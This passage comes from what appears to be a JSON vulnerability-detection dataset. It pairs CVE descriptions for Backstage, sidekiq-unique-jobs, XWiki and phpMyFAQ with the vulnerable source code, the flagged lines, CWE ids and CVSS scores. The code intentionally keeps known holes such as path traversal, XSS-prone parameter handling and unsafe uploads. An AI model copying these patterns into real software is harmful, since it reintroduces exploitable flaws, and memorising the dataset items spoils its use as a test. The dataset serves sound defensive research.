venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)\n\n\ndef _demo_uuid() -> str:\n    \"\"\"\n    This function generates a repeatable UUID, drawing on non-varying elements of the environment and process call for entropy.\n\n    This function is not intended to be called outside of this module.  Instead, local_uuid() should be called.\n\n    WARNING: This function was developed for use ONLY for reducing (but not eliminating) version-control edits to identifiers when generating sample data.  It creates UUIDs that are decidedly NOT random, and should remain consistent on repeated calls to the importing script.\n\n    To prevent accidental non-random UUID usage, two setup steps need to be done before calling this function:\n\n    * An environment variable, CASE_DEMO_NONRANDOM_UUID_BASE, must be set to a string provided by the caller.  The variable's required value is the path to some directory.  The variable's recommended value is the equivalent of the Make variable \"top_srcdir\" - that is, the root directory of the containing Git repository, some parent of the current process's current working directory.\n    * The configure() function in this module must be called.\n    \"\"\"\n    global DEMO_UUID_BASE\n    global DEMO_UUID_COUNTER\n\n    if os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\") is None:\n        raise ValueError(\n            \"demo_uuid() called without CASE_DEMO_NONRANDOM_UUID_BASE in environment.\"\n        )\n\n    if DEMO_UUID_BASE is None:\n        raise ValueError(\"demo_uuid() called with DEMO_UUID_BASE unset.\")\n\n    parts = [DEMO_UUID_BASE]\n\n    # Component: Incrementing counter.\n    DEMO_UUID_COUNTER += 1\n    parts.append(str(DEMO_UUID_COUNTER))\n\n    return str(uuid.uuid5(uuid.NAMESPACE_URL, \"/\".join(parts)))\n\n\ndef local_uuid() -> str:\n    \"\"\"\n    Generate either a UUID4, or if requested via environment configuration, a non-random demo UUID.\n    \"\"\"\n    global DEMO_UUID_BASE\n    if DEMO_UUID_BASE is None:\n        return str(uuid.uuid4())\n    else:\n        return _demo_uuid()\n"
        }
      ],
      "method_level": [
        "def configure() -> None:\n    \"\"\"\n    This function is part of setting up _demo_uuid() to generate non-random UUIDs.  See _demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid._demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)"
      ],
      "hunk_level": [
        {
          "line_no": 100,
          "content": "        try:"
        },
        {
          "line_no": 106,
          "content": "        except ValueError:"
        },
        {
          "line_no": 107,
          "content": "            # _logger.debug(\"Command path is not relative to virtual environment path.\")"
        },
        {
          "line_no": 108,
          "content": "            demo_uuid_base_parts.append(str(command_resolved_path))"
        }
      ]
    },
    "cwe": [
      "CWE-215",
      "CWE-337"
    ],
    "severity": "LOW",
    "cvss_score": 2.2,
    "cvss_version": 3.1
  },
  {
    "id": 335,
    "cve": "CVE-2024-26150",
    "description": "`@backstage/backend-common` is a common functionality library for backends for Backstage, an open platform for building developer portals. In `@backstage/backend-common` prior to versions 0.21.1, 0.20.2, and 0.19.10, paths checks with the `resolveSafeChildPath` utility were not exhaustive enough, leading to risk of path traversal vulnerabilities if symlinks can be injected by attackers. This issue is patched in `@backstage/backend-common` versions 0.21.1, 0.20.2, and 0.19.10.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/backend-common/src/paths.ts",
          "content": "/*\n * Copyright 2020 The Backstage Authors\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\nimport { isChildPath } from '@backstage/cli-common';\nimport { NotAllowedError } from '@backstage/errors';\nimport { resolve as resolvePath } from 'path';\nimport { realpathSync as realPath } from 'fs';\n\n/** @internal */\nexport const packagePathMocks = new Map<\n  string,\n  (paths: string[]) => string | undefined\n>();\n\n/**\n * Resolve a path relative to the root of a package directory.\n * Additional path arguments are resolved relative to the package dir.\n *\n * This is particularly useful when you want to access assets shipped with\n * your backend plugin package. When doing so, do not forget to include the assets\n * in your published package by adding them to `files` in your `package.json`.\n *\n * @public\n */\nexport function resolvePackagePath(name: string, ...paths: string[]) {\n  const mockedResolve = packagePathMocks.get(name);\n  if (mockedResolve) {\n    const resolved = mockedResolve(paths);\n    if (resolved) {\n      return resolved;\n    }\n  }\n\n  const req =\n    typeof __non_webpack_require__ === 'undefined'\n      ? require\n      : __non_webpack_require__;\n\n  return resolvePath(req.resolve(`${name}/package.json`), '..', ...paths);\n}\n\n/**\n * Resolves a target path from a base path while guaranteeing that the result is\n * a path that point to or within the base path. This is useful for resolving\n * paths from user input, as it otherwise opens up for vulnerabilities.\n *\n * @public\n * @param base - The base directory to resolve the path from.\n * @param path - The target path, relative or absolute\n * @returns A path that is guaranteed to point to or within the base path.\n */\nexport function resolveSafeChildPath(base: string, path: string): string {\n  const resolvedBasePath = resolveRealPath(base);\n  const targetPath = resolvePath(resolvedBasePath, path);\n\n  if (!isChildPath(resolvedBasePath, resolveRealPath(targetPath))) {\n    throw new NotAllowedError(\n      'Relative path is not allowed to refer to a directory outside its parent',\n    );\n  }\n\n  return targetPath;\n}\n\nfunction resolveRealPath(path: string): string {\n  try {\n    return realPath(path);\n  } catch (ex) {\n    if (ex.code !== 'ENOENT') {\n      throw ex;\n    }\n  }\n\n  return path;\n}\n// Re-export isChildPath so that backend packages don't need to depend on cli-common\nexport { isChildPath };\n"
        }
      ],
      "method_level": [
        "resolveSafeChildPath"
      ],
      "hunk_level": [
        {
          "line_no": 75,
          "content": "  return targetPath;"
        }
      ]
    },
    "cwe": [
      "CWE-22"
    ],
    "severity": "HIGH",
    "cvss_score": 8.7,
    "cvss_version": 3.1
  },
  {
    "id": 284,
    "cve": "CVE-2024-25122",
    "description": "sidekiq-unique-jobs is an open source project which prevents simultaneous Sidekiq jobs with the same unique arguments to run. Specially crafted GET request parameters handled by any of the following endpoints of sidekiq-unique-jobs' \"admin\" web UI, allow a super-user attacker, or an unwitting, but authorized, victim, who has received a disguised / crafted link, to successfully execute malicious code, which could potentially steal cookies, session data, or local storage data from the app the sidekiq-unique-jobs web UI is mounted in. 1. `/changelogs`, 2. `/locks` or 3. `/expiring_locks`. This issue has been addressed in versions 7.1.33 and 8.0.7. Users are advised to upgrade. There are no known workarounds for this vulnerability.\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "lib/sidekiq_unique_jobs/web.rb",
          "content": "# frozen_string_literal: true\n\nrequire_relative \"web/helpers\"\n\nmodule SidekiqUniqueJobs\n  # Utility module to help manage unique keys in redis.\n  # Useful for deleting keys that for whatever reason wasn't deleted\n  # @author Mikael Henriksson <mikael@mhenrixon.com>\n  module Web\n    def self.registered(app) # rubocop:disable Metrics/MethodLength, Metrics/AbcSize, Metrics/CyclomaticComplexity, Metrics/PerceivedComplexity\n      app.helpers do\n        include Web::Helpers\n      end\n\n      app.get \"/changelogs\" do\n        @filter         = params[:filter] || \"*\"\n        @filter         = \"*\" if @filter == \"\"\n        @count          = (params[:count] || 100).to_i\n        @current_cursor = params[:cursor].to_i\n        @prev_cursor    = params[:prev_cursor].to_i\n        @total_size, @next_cursor, @changelogs = changelog.page(\n          cursor: @current_cursor,\n          pattern: @filter,\n          page_size: @count,\n        )\n\n        erb(unique_template(:changelogs))\n      end\n\n      app.get \"/changelogs/delete_all\" do\n        changelog.clear\n        redirect_to :changelogs\n      end\n\n      app.get \"/locks\" do\n        @filter         = params[:filter] || \"*\"\n        @filter         = \"*\" if @filter == \"\"\n        @count          = (params[:count] || 100).to_i\n        @current_cursor = params[:cursor].to_i\n        @prev_cursor    = params[:prev_cursor].to_i\n\n        @total_size, @next_cursor, @locks = digests.page(\n          cursor: @current_cursor,\n          pattern: @filter,\n          page_size: @count,\n        )\n\n        erb(unique_template(:locks))\n      end\n\n      app.get \"/expiring_locks\" do\n        @filter         = params[:filter] || \"*\"\n        @filter         = \"*\" if @filter == \"\"\n        @count          = (params[:count] || 100).to_i\n        @current_cursor = params[:cursor].to_i\n        @prev_cursor    = params[:prev_cursor].to_i\n\n        @total_size, @next_cursor, @locks = expiring_digests.page(\n          cursor: @current_cursor,\n          pattern: @filter,\n          page_size: @count,\n        )\n\n        erb(unique_template(:locks))\n      end\n\n      app.get \"/locks/delete_all\" do\n        digests.delete_by_pattern(\"*\", count: digests.count)\n        expiring_digests.delete_by_pattern(\"*\", count: digests.count)\n        redirect_to :locks\n      end\n\n      app.get \"/locks/:digest\" do\n        @digest = params[:digest]\n        @lock   = SidekiqUniqueJobs::Lock.new(@digest)\n\n        erb(unique_template(:lock))\n      end\n\n      app.get \"/locks/:digest/delete\" do\n        digests.delete_by_digest(params[:digest])\n        expiring_digests.delete_by_digest(params[:digest])\n        redirect_to :locks\n      end\n\n      app.get \"/locks/:digest/jobs/:job_id/delete\" do\n        @digest = params[:digest]\n        @lock   = SidekiqUniqueJobs::Lock.new(@digest)\n        @lock.unlock(params[:job_id])\n\n        redirect_to \"locks/#{@lock.key}\"\n      end\n    end\n  end\nend\n\nbegin\n  require \"delegate\" unless defined?(DelegateClass)\n  require \"sidekiq/web\" unless defined?(Sidekiq::Web)\n\n  Sidekiq::Web.register(SidekiqUniqueJobs::Web)\n  Sidekiq::Web.tabs[\"Locks\"]          = \"locks\"\n  Sidekiq::Web.tabs[\"Expiring Locks\"] = \"expiring_locks\"\n  Sidekiq::Web.tabs[\"Changelogs\"]     = \"changelogs\"\n  Sidekiq::Web.settings.locales << File.join(File.dirname(__FILE__), \"locales\")\nrescue NameError, LoadError => ex\n  SidekiqUniqueJobs.logger.error(ex)\nend\n"
        }
      ],
      "method_level": [
        "def self.registered(app) # rubocop:disable Metrics/MethodLength, Metrics/AbcSize, Metrics/CyclomaticComplexity, Metrics/PerceivedComplexity\n      app.helpers do\n        include Web::Helpers\n      end\n\n      app.get \"/changelogs\" do\n        @filter         = params[:filter] || \"*\"\n        @filter         = \"*\" if @filter == \"\"\n        @count          = (params[:count] || 100).to_i\n        @current_cursor = params[:cursor].to_i\n        @prev_cursor    = params[:prev_cursor].to_i\n        @total_size, @next_cursor, @changelogs = changelog.page(\n          cursor: @current_cursor,\n          pattern: @filter,\n          page_size: @count,\n        )\n\n        erb(unique_template(:changelogs))\n      end\n\n      app.get \"/changelogs/delete_all\" do\n        changelog.clear\n        redirect_to :changelogs\n      end\n\n      app.get \"/locks\" do\n        @filter         = params[:filter] || \"*\"\n        @filter         = \"*\" if @filter == \"\"\n        @count          = (params[:count] || 100).to_i\n        @current_cursor = params[:cursor].to_i\n        @prev_cursor    = params[:prev_cursor].to_i\n\n        @total_size, @next_cursor, @locks = digests.page(\n          cursor: @current_cursor,\n          pattern: @filter,\n          page_size: @count,\n        )\n\n        erb(unique_template(:locks))\n      end\n\n      app.get \"/expiring_locks\" do\n        @filter         = params[:filter] || \"*\"\n        @filter         = \"*\" if @filter == \"\"\n        @count          = (params[:count] || 100).to_i\n        @current_cursor = params[:cursor].to_i\n        @prev_cursor    = params[:prev_cursor].to_i\n\n        @total_size, @next_cursor, @locks = expiring_digests.page(\n          cursor: @current_cursor,\n          pattern: @filter,\n          page_size: @count,\n        )\n\n        erb(unique_template(:locks))\n      end\n\n      app.get \"/locks/delete_all\" do\n        digests.delete_by_pattern(\"*\", count: digests.count)\n        expiring_digests.delete_by_pattern(\"*\", count: digests.count)\n        redirect_to :locks\n      end\n\n      app.get \"/locks/:digest\" do\n        @digest = params[:digest]\n        @lock   = SidekiqUniqueJobs::Lock.new(@digest)\n\n        erb(unique_template(:lock))\n      end\n\n      app.get \"/locks/:digest/delete\" do\n        digests.delete_by_digest(params[:digest])\n        expiring_digests.delete_by_digest(params[:digest])\n        redirect_to :locks\n      end\n\n      app.get \"/locks/:digest/jobs/:job_id/delete\" do\n        @digest = params[:digest]\n        @lock   = SidekiqUniqueJobs::Lock.new(@digest)\n        @lock.unlock(params[:job_id])\n\n        redirect_to \"locks/#{@lock.key}\"\n      end\n    end"
      ],
      "hunk_level": [
        {
          "line_no": 16,
          "content": "        @filter         = params[:filter] || \"*\""
        },
        {
          "line_no": 18,
          "content": "        @count          = (params[:count] || 100).to_i"
        },
        {
          "line_no": 19,
          "content": "        @current_cursor = params[:cursor].to_i"
        },
        {
          "line_no": 20,
          "content": "        @prev_cursor    = params[:prev_cursor].to_i"
        },
        {
          "line_no": 36,
          "content": "        @filter         = params[:filter] || \"*\""
        },
        {
          "line_no": 38,
          "content": "        @count          = (params[:count] || 100).to_i"
        },
        {
          "line_no": 39,
          "content": "        @current_cursor = params[:cursor].to_i"
        },
        {
          "line_no": 40,
          "content": "        @prev_cursor    = params[:prev_cursor].to_i"
        },
        {
          "line_no": 52,
          "content": "        @filter         = params[:filter] || \"*\""
        },
        {
          "line_no": 54,
          "content": "        @count          = (params[:count] || 100).to_i"
        },
        {
          "line_no": 55,
          "content": "        @current_cursor = params[:cursor].to_i"
        },
        {
          "line_no": 56,
          "content": "        @prev_cursor    = params[:prev_cursor].to_i"
        },
        {
          "line_no": 74,
          "content": "        @digest = params[:digest]"
        },
        {
          "line_no": 81,
          "content": "        digests.delete_by_digest(params[:digest])"
        },
        {
          "line_no": 82,
          "content": "        expiring_digests.delete_by_digest(params[:digest])"
        },
        {
          "line_no": 87,
          "content": "        @digest = params[:digest]"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "HIGH",
    "cvss_score": 7.1,
    "cvss_version": 3.1
  },
  {
    "id": 621,
    "cve": "CVE-2024-31986",
    "description": "XWiki Platform is a generic wiki platform. Starting in version 3.1 and prior to versions 4.10.19, 15.5.4, and 15.10-rc-1, by creating a document with a special crafted documented reference and an `XWiki.SchedulerJobClass` XObject, it is possible to execute arbitrary code on the server whenever an admin visits the scheduler page or the scheduler page is referenced, e.g., via an image in a comment on a page in the wiki. The vulnerability has been fixed in XWiki 14.10.19, 15.5.5, and 15.9. As a workaround, apply the patch manually by modifying the `Scheduler.WebHome` page.",
    "vulnerability": {
      "file_level": [
        {
          "name": "xwiki-platform-core/xwiki-platform-scheduler/xwiki-platform-scheduler-test/xwiki-platform-scheduler-test-docker/src/test/it/org/xwiki/scheduler/test/ui/SchedulerIT.java",
          "content": "/*\n * See the NOTICE file distributed with this work for additional\n * information regarding copyright ownership.\n *\n * This is free software; you can redistribute it and/or modify it\n * under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation; either version 2.1 of\n * the License, or (at your option) any later version.\n *\n * This software is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this software; if not, write to the Free\n * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n * 02110-1301 USA, or see the FSF site: http://www.fsf.org.\n */\npackage org.xwiki.scheduler.test.ui;\n\nimport org.junit.jupiter.api.Order;\nimport org.junit.jupiter.api.Test;\nimport org.openqa.selenium.By;\nimport org.xwiki.scheduler.test.po.SchedulerHomePage;\nimport org.xwiki.scheduler.test.po.SchedulerPage;\nimport org.xwiki.scheduler.test.po.editor.SchedulerEditPage;\nimport org.xwiki.test.docker.junit5.UITest;\nimport org.xwiki.test.ui.TestUtils;\n\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertFalse;\nimport static org.junit.jupiter.api.Assertions.fail;\n\n/**\n * Tests Scheduler application features.\n *\n * @version $Id$\n */\n@UITest(\n    properties = {\n        // The scheduler UI need programming right\n        \"xwikiPropertiesAdditionalProperties=test.prchecker.excludePattern=xwiki:Scheduler\\\\.WebHome\",\n\n        // Override in order to add the Scheduler Plugin\n        \"xwikiCfgPlugins=com.xpn.xwiki.plugin.skinx.JsSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.JsSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.LinkExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.scheduler.SchedulerPlugin\"\n    },\n    extraJARs = {\n        // The Scheduler plugin needs to be in WEB-INF/lib since it's defined in xwiki.cfg and plugins are loaded\n        // by XWiki at startup, i.e. before extensions are provisioned for the tests\n        \"org.xwiki.platform:xwiki-platform-scheduler-api\",\n        // Because of https://jira.xwiki.org/browse/XWIKI-17972 we need to install the jython jar manually in\n        // WEB-INF/lib.\n        \"org.python:jython-slim:2.7.3\"\n})\nclass SchedulerIT\n{\n    @Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }\n\n    @Test\n    @Order(2)\n    void verifyEscaping(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        schedulerEdit.setScript(\"{{/code}}\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n\n        assertEquals(\"{{/code}}\", schedulerPage.getScript());\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 73,
          "content": "        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");"
        },
        {
          "line_no": 77,
          "content": "        schedulerHomePage.setJobName(\"SchedulerTestJob\");"
        },
        {
          "line_no": 110,
          "content": "        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");"
        }
      ]
    },
    "cwe": [
      "CWE-352",
      "CWE-95"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.0,
    "cvss_version": 3.1
  },
  {
    "id": 514,
    "cve": "CVE-2024-28105",
    "description": "phpMyFAQ is an open source FAQ web application for PHP 8.1+ and MySQL, PostgreSQL and other databases. The category image upload function in phpmyfaq is vulnerable to manipulation of the `Content-type` and `lang` parameters, allowing attackers to upload malicious files with a .php extension, potentially leading to remote code execution (RCE) on the system. This vulnerability is fixed in 3.2.6.",
    "vulnerability": {
      "file_level": [
        {
          "name": "phpmyfaq/src/phpMyFAQ/Attachment/File.php",
          "content": "<?php\n\n/**\n * Attachment handler class for files stored in filesystem.\n *\n * This Source Code Form is subject to the terms of the Mozilla Public License,\n * v. 2.0. If a copy of the MPL was not distributed with this file, You can\n * obtain one at https://mozilla.org/MPL/2.0/.\n *\n * @package   phpMyFAQ\n * @author    Anatoliy Belsky <ab@php.net>\n * @copyright 2009-2023 phpMyFAQ Team\n * @license   https://www.mozilla.org/MPL/2.0/ Mozilla Public License Version 2.0\n * @link      https://www.phpmyfaq.de\n * @since     2009-08-21\n */\n\nnamespace phpMyFAQ\\Attachment;\n\nuse phpMyFAQ\\Attachment\\Filesystem\\AbstractFile as FilesystemFile;\nuse phpMyFAQ\\Attachment\\Filesystem\\File\\EncryptedFile;\nuse phpMyFAQ\\Attachment\\Filesystem\\File\\FileException;\nuse phpMyFAQ\\Attachment\\Filesystem\\File\\VanillaFile;\n\n/**\n * Class File\n *\n * @package phpMyFAQ\\Attachment\n */\nclass File extends AttachmentAbstract implements AttachmentInterface\n{\n    /**\n     * Build file path under which the attachment, file is accessible in filesystem\n     *\n     * @throws AttachmentException\n     */\n    protected function buildFilePath(): string\n    {\n        $attachmentPath = PMF_ATTACHMENTS_DIR;\n        $fsHash = $this->mkVirtualHash();\n        $subDirCount = 3;\n        $subDirNameLength = 5;\n\n        for ($i = 0; $i < $subDirCount; ++$i) {\n            $attachmentPath .= DIRECTORY_SEPARATOR . substr($fsHash, $i * 